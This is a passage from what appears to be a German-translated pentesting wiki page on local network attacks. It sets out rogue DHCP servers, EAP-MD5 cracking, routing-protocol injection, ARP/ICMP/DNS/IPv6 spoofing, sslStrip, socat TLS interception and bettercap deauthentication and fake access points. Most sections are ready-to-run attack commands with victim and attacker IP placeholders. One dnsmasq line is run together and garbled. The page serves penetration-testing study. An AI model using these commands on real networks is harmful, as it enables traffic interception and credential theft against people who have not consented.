- **Unsere IP-Adresse (Gateway-Ankündigung)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Lokaler DNS-Domainname**: Optional `-d example.org` verwenden, um einen lokalen DNS-Domainnamen festzulegen.
- **IP des ursprünglichen Routers/Gateways**: Verwende `-r 10.0.0.1`, um die IP des legitimen Routers/Gateways anzugeben.
- **IP des primären DNS-Servers**: Verwende `-p 10.0.0.100`, um die IP des von dir kontrollierten rogue DNS-Servers festzulegen.
- **IP des sekundären DNS-Servers**: Optional `-s 10.0.0.1` verwenden, um eine sekundäre DNS-Server-IP anzugeben.
- **Netzmaske des lokalen Netzwerks**: Verwende `-n 255.255.255.0`, um die Netzmaske für das lokale Netzwerk zu definieren.
- **Interface für DHCP-Traffic**: Verwende `-I eth1`, um auf einem bestimmten Netzwerkinterface auf DHCP-Traffic zu lauschen.
- **WPAD-Konfigurationsadresse**: Verwende `-w “http://10.0.0.100/wpad.dat”`, um die Adresse für die WPAD-Konfiguration zu setzen, was beim Abfangen von Web-Traffic hilft.
- **Default Gateway IP fälschen**: `-S` einschließen, um die IP des Standard-Gateways zu spoofen.
- **Auf alle DHCP-Anfragen antworten**: `-R` einschließen, damit der Server auf alle DHCP-Anfragen antwortet; beachte, dass dies sehr auffällig ist und erkannt werden kann.

Durch korrekte Verwendung dieser Optionen lässt sich ein rogue DHCP-Server einrichten, um Netzwerkverkehr effektiv abzufangen.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP-Angriffe**

Hier sind einige der Angriffstaktiken, die gegen 802.1X-Implementierungen eingesetzt werden können:

- Aktive brute-force-Passwort-Angriffe über EAP
- Angriff auf den RADIUS-Server mit fehlerhaftem EAP-Inhalt _\*\*_(exploits)
- Mitschnitt von EAP-Nachrichten und offline Passwort-Cracking (EAP-MD5 und PEAP)
- Erzwingen der EAP-MD5-Authentifizierung, um TLS-Zertifikatvalidierung zu umgehen
- Einspeisung bösartigen Netzwerkverkehrs beim Authentifizieren über einen Hub oder Ähnliches

Wenn der Angreifer sich zwischen dem Opfer und dem Authentifizierungsserver befindet, könnte er versuchen, das Authentifizierungsprotokoll (falls nötig) auf EAP-MD5 herabzustufen und den Authentifizierungsversuch mitzuschneiden. Dann könnte er diesen per brute-force knacken mit:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Angriffe <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) ist eine Klasse von Netzwerkprotokollen, die dazu entwickelt wurden, ein hochverfügbares redundantes Routing-System zu schaffen. Mit FHRP können physische Router zu einem einzigen logischen Gerät zusammengefasst werden, was die Fehlertoleranz erhöht und zur Lastverteilung beiträgt.

**Cisco Systems-Ingenieure haben zwei FHRP-Protokolle entwickelt: GLBP und HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Es sind drei Versionen des Routing Information Protocol (RIP) bekannt: RIP, RIPv2 und RIPng. RIP und RIPv2 senden Datagramme an Peers über UDP-Port 520, während RIPng Datagramme per IPv6-Multicast an UDP-Port 521 sendet. RIPv2 führte Unterstützung für MD5-Authentifizierung ein. RIPng hingegen enthält keine native Authentifizierung und verlässt sich stattdessen auf optionale IPsec AH- und ESP-Header in IPv6.

- **RIP und RIPv2:** Kommunikation erfolgt über UDP-Datagramme auf Port 520.
- **RIPng:** Nutzt UDP-Port 521, um Datagramme via IPv6-Multicast zu übertragen.

Beachte, dass RIPv2 MD5-Authentifizierung unterstützt, während RIPng keine native Authentifizierung enthält und auf IPsec AH/ESP in IPv6 angewiesen ist.

### EIGRP-Angriffe

**EIGRP (Enhanced Interior Gateway Routing Protocol)** ist ein dynamisches Routingprotokoll. **Es ist ein Distanzvektorprotokoll.** Fehlen Authentifizierung und die Konfiguration passiver Interfaces, kann ein **Angreifer** in das EIGRP-Routing eingreifen und **Routing-Tabellen vergiften**. Außerdem ist ein EIGRP-Netzwerk (also das autonome System) **flach und nicht in Zonen segmentiert**. Wenn ein **Angreifer eine Route injiziert**, wird diese Route wahrscheinlich im gesamten autonomen EIGRP-System **verbreitet**.

Um ein EIGRP-System anzugreifen, muss eine **Nachbarschaft zu einem legitimen EIGRP-Router** aufgebaut werden, was viele Möglichkeiten eröffnet — von einfacher Aufklärung bis zu verschiedenen Injektionen.

[**FRRouting**](https://frrouting.org/) ermöglicht die Implementierung **eines virtuellen Routers, der BGP, OSPF, EIGRP, RIP und andere Protokolle unterstützt.** Du musst es lediglich auf dem System des Angreifers deployen, und kannst dich tatsächlich als legitimer Router im Routing-Domain ausgeben.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) kann EIGRP-Broadcasts abfangen. Es erlaubt außerdem das Injizieren von Paketen, die genutzt werden können, um Routing-Konfigurationen zu verändern.

### OSPF

Im Open Shortest Path First (OSPF)-Protokoll wird häufig MD5-Authentifizierung verwendet, um die Kommunikation zwischen Routern abzusichern. Diese Sicherheitsmaßnahme kann jedoch mit Tools wie Loki und John the Ripper kompromittiert werden. Diese Tools sind in der Lage, MD5-Hashes zu erfassen und zu knacken, wodurch der Authentifizierungsschlüssel offengelegt wird. Sobald dieser Schlüssel erlangt ist, kann er verwendet werden, um neue Routing-Informationen einzubringen. Zur Konfiguration der Routenparameter und zum Setzen des kompromittierten Schlüssels werden jeweils die _Injection_- und _Connection_-Tabs verwendet.

- **Erfassen und Knacken von MD5-Hashes:** Tools wie Loki und John the Ripper werden dafür verwendet.
- **Konfiguration der Routenparameter:** Erfolgt über den _Injection_-Tab.
- **Setzen des kompromittierten Schlüssels:** Wird im _Connection_-Tab vorgenommen.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Tool, um Netzwerkverkehr zu scannen und Schwachstellen zu finden
- Weitere Informationen über Netzwerkangriffe findest du [**hier**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Der Angreifer konfiguriert alle Netzwerkparameter (GW, IP, DNS) des neuen Mitglieds im Netzwerk, indem er gefälschte DHCP-Antworten sendet.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Siehe die [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect besteht darin, ein ICMP packet type 1 code 5 zu senden, das anzeigt, dass der Angreifer der beste Weg ist, um eine IP zu erreichen. Dann, wenn das Opfer die IP kontaktieren möchte, wird das Paket über den Angreifer gesendet.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Der attacker wird einige (oder alle) Domains auflösen, die das victim anfragt.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Eigenen DNS mit dnsmasq konfigurieren**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokale Gateways

Es existieren häufig mehrere Routen zu Systemen und Netzwerken. Nachdem Sie eine Liste der MAC-Adressen im lokalen Netzwerk erstellt haben, verwenden Sie _gateway-finder.py_, um Hosts zu identifizieren, die IPv4-Weiterleitung unterstützen.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Für die lokale Namensauflösung, wenn DNS-Abfragen fehlschlagen, verlassen sich Microsoft-Systeme auf **Link-Local Multicast Name Resolution (LLMNR)** und den **NetBIOS Name Service (NBT-NS)**. Ebenso nutzen **Apple Bonjour** und **Linux zero-configuration** Implementierungen **Multicast DNS (mDNS)**, um Systeme im Netzwerk zu entdecken. Aufgrund der nicht authentifizierten Natur dieser Protokolle und ihrer Arbeitsweise über UDP-Broadcasts können sie von Angreifern ausgenutzt werden, um Benutzer auf bösartige Dienste umzuleiten.

You can impersonate services that are searched by hosts using Responder to send fake responses.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Browser verwenden häufig das **Web Proxy Auto-Discovery (WPAD) protocol**, um Proxy-Einstellungen automatisch zu beziehen. Dabei werden Konfigurationsdaten von einem Server abgerufen, typischerweise über eine URL wie "http://wpad.example.org/wpad.dat". Die Erkennung dieses Servers durch Clients kann auf verschiedenen Wegen erfolgen:

- Über **DHCP**, wobei die Entdeckung durch die Verwendung eines speziellen Codes (252) ermöglicht wird.
- Über **DNS**, wobei nach einem Hostnamen mit der Bezeichnung _wpad_ innerhalb der lokalen Domain gesucht wird.
- Über **Microsoft LLMNR and NBT-NS**, die als Fallback-Mechanismen dienen, wenn DNS-Abfragen fehlschlagen.

Das Tool Responder nutzt dieses Protokoll aus, indem es als **malicious WPAD server** auftritt. Es verwendet DHCP, DNS, LLMNR und NBT-NS, um Clients dazu zu verleiten, sich mit ihm zu verbinden. To dive deeper into how services can be impersonated using Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Du kannst verschiedene Dienste im Netzwerk anbieten, um einen Benutzer zu täuschen und dazu zu bringen, **Klartext-Anmeldeinformationen** einzugeben. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Dieser Angriff ist dem ARP Spoofing sehr ähnlich, aber in der IPv6-Welt. Du kannst das Opfer dazu bringen zu glauben, dass die IPv6-Adresse des GW die MAC-Adresse des Angreifers hat.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Einige OS konfigurieren standardmäßig das Gateway anhand der im Netzwerk gesendeten RA-Pakete. Um den Angreifer als IPv6-Router zu deklarieren, können Sie Folgendes verwenden:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Standardmäßig versuchen einige OS, die DNS-Konfiguration zu übernehmen, indem sie ein DHCPv6-Paket im Netzwerk auslesen. Ein Angreifer könnte dann ein DHCPv6-Paket senden, um sich selbst als DNS zu konfigurieren. DHCP stellt dem Opfer außerdem eine IPv6-Adresse bereit.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

Im Wesentlichen funktioniert dieser Angriff so: Falls der **Benutzer** versucht, auf eine **HTTP**-Seite zu **zugreifen**, die auf die **HTTPS**-Version **weiterleitet**. **sslStrip** wird eine **HTTP-Verbindung mit** dem **Client** und eine **HTTPS-Verbindung mit** dem **Server** **aufrechterhalten**, sodass ein **sniff** der Verbindung im **Klartext** möglich ist.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mehr Infos [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy zur Umgehung von HSTS

Der **Unterschied** zwischen **sslStrip+ and dns2proxy** gegenüber **sslStrip** ist, dass sie zum Beispiel _**www.facebook.com**_ **auf** _**wwww.facebook.com**_ (beachte das **zusätzliche** "**w**") umleiten und die **Adresse dieser Domain als Angreifer-IP** setzen. Auf diese Weise wird der **Client** sich mit _**wwww.facebook.com**_ **(der Angreifer)** verbinden, aber hinter den Kulissen wird **sslstrip+** die **echte Verbindung** über https zu **www.facebook.com** **aufrechterhalten**.

Das **Ziel** dieser Technik ist es, **HSTS zu umgehen**, weil _**wwww**.facebook.com_ **nicht** im **Cache** des Browsers gespeichert wird, sodass der Browser dazu verleitet wird, die **Facebook-Authentifizierung über HTTP** durchzuführen.\
Beachte, dass um diesen Angriff durchzuführen das Opfer zunächst versuchen muss, auf [http://www.faceook.com](http://www.faceook.com) und nicht auf https zuzugreifen. Dies kann erreicht werden, indem die Links innerhalb einer http-Seite modifiziert werden.

Mehr Infos [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ funktionieren nicht mehr. Das liegt daran, dass HSTS-Regeln in den Browsern vorab gespeichert sind, sodass selbst wenn ein Benutzer zum ersten Mal auf eine „wichtige“ Domain zugreift, er sie über HTTPS erreichen wird. Beachte außerdem, dass die vorab gespeicherten Regeln und andere generierte Regeln das Flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **verwenden können, sodass das** _**wwww.facebook.com**_ **Beispiel von vorher nicht mehr funktioniert, da** _**facebook.com**_ **HSTS mit `includeSubdomains` verwendet.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP: auf Port lauschen
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL auf Port lauschen

#### Schlüssel und selbstsigniertes Zertifikat generieren
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Lauschen mit certificate
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Mit certificate lauschen und an hosts weiterleiten
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Manchmal, wenn der Client überprüft, dass die CA gültig ist, könntest du **serve a certificate of other hostname signed by a CA**.\
Ein weiterer interessanter Test ist, eine c**ertificate of the requested hostname but self-signed** auszugeben.

Weitere Dinge, die man testen kann, sind zu versuchen, das certificate mit einem valid certificate zu signieren, das keine gültige CA ist. Oder die valid public key zu verwenden, erzwingen, dass ein Algorithmus wie diffie hellman genutzt wird (einer, der nichts mit dem echten private key entschlüsseln muss) und wenn der client eine probe des echten private key anfordert (wie einen hash), eine gefälschte probe senden und erwarten, dass der client dies nicht prüft.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktive Discovery-Hinweise

Beachte, dass wenn ein UDP-Paket an ein Gerät gesendet wird, das den angeforderten Port nicht hat, eine ICMP-Antwort (Port Unreachable) gesendet wird.

### **ARP-Erkennung**

ARP-Pakete werden verwendet, um zu erkennen, welche IPs im Netzwerk verwendet werden. Der PC muss für jede mögliche IP-Adresse eine Anfrage senden, und nur die verwendeten Adressen antworten.

### **mDNS (multicast DNS)**

Bettercap sendet eine MDNS-Anfrage (alle X ms) für **\_services\_.dns-sd.\_udp.local**. Die Maschine, die dieses Paket sieht, antwortet normalerweise auf diese Anfrage. Danach sucht es nur nach Maschinen, die auf "services" antworten.

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap sendet Broadcast-Pakete an Port 137/UDP und fragt nach dem Namen "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap sendet SSDP-Broadcasts, die nach allen Arten von Services suchen (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap sendet WSD-Broadcasts, die nach Services suchen (UDP Port 3702).


### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Referenzen

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
